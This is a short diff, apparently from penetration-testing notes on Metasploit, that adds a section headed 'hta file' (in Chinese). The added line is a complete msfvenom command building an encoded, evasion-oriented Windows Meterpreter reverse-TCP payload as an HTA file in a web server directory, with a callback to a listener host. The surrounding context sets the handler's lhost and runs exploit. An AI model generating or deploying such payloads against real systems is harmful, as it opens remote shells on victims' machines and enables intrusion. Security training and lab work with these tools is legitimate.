@@ -88,7 +88,8 @@ options
 set lhost 192.168.100.143
 exploit   
 
-
+	@hta文件@
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -f hta-psh -o /var/www/html/1.hta
 
 
 
